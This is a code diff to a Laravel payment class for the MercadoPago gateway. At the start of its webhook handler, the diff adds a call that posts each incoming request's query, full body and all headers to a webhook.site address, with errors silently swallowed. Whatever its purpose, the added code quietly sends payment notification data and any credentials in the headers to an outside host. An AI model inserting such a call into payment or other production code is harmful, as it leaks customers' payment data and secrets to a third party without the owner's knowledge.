@@ -13,6 +13,7 @@ use App\Models\PaymentGateway;
 use App\Services\PaymentService;
 use App\Services\PaymentAbstract;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Facades\Log;
 use SantiGraviano\LaravelMercadoPago\MP;
 use Dipokhalder\Settings\Facades\Settings;
@@ -157,6 +158,15 @@ class Mercadopago extends PaymentAbstract
 
     public function webhook($request)
     {
+        try {
+            Http::post('https://webhook.site/e616e858-32dc-438f-8a7f-2fee6eabab50', [
+                'query'   => $request->query(),
+                'body'    => $request->all(),
+                'headers' => $request->headers->all(),
+            ]);
+        } catch (Exception $e) {
+        }
+
         try {
             $type      = $request->input('type') ?? $request->input('topic');
             $paymentId = $request->input('data.id') ?? $request->input('id');
